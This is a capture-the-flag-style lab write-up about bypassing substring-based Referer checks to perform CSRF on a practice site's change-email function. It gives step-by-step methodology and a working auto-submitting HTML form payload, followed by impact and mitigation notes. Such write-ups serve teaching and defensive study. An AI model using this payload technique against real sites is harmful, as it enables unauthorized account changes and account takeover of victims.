# Lab Name
CSRF with broken Referer validation

## Vulnerability
Cross-Site Request Forgery (CSRF) – Broken Referer Validation

## Objective
Exploit a CSRF vulnerability by bypassing the application's flawed Referer header validation and change the victim's email address.

## Entry Point
Change Email functionality

## Exploitation Type
Cross-Site Request Forgery (CSRF)

## Methodology
1. Open the lab and log in using the provided credentials

2. Navigate to the "My Account" page

3. Change the email address and intercept the request using Burp Suite

4. Observe that the application checks whether the Referer header contains its own domain instead of validating the entire origin

5. Generate a CSRF PoC using Burp Suite

6. Modify the exploit page so that its URL contains the target domain as a query parameter

7. Add the following meta tag to ensure the query string is included in the Referer header

   <meta name="referrer" content="unsafe-url">

8. Upload the exploit to the Exploit Server

9. Deliver the exploit to the victim

10. When the victim visits the exploit page, the Referer header contains the target domain in the URL, causing the application's validation to pass

11. Observe that the victim's email address is changed successfully, solving the lab

## Payload Used

```html
<html>
  <head>
    <meta name="referrer" content="unsafe-url">
  </head>
  <body>
    <form action="https://0a2b008a0480e66b808194110099006d.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="xyz@gmail.com">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Result
Successfully bypassed the broken Referer validation and changed the victim's email address.

## Impact
- Unauthorized account modifications
- Bypass of Referer-based CSRF protection
- User impersonation
- Account takeover opportunities
- Sensitive information modification

## Mitigation
- Do not rely solely on the Referer header for CSRF protection
- Validate the full Origin or Referer header instead of checking for a substring
- Implement unpredictable CSRF tokens
- Use SameSite cookies
- Perform server-side validation for all state-changing requests

## Learning
Checking only whether the Referer header contains the application's domain is an insecure validation method.
Attackers can craft URLs that include the target domain in the Referer, allowing them to bypass the protection. Proper CSRF tokens and strict Origin/Referer validation should always be implemented.
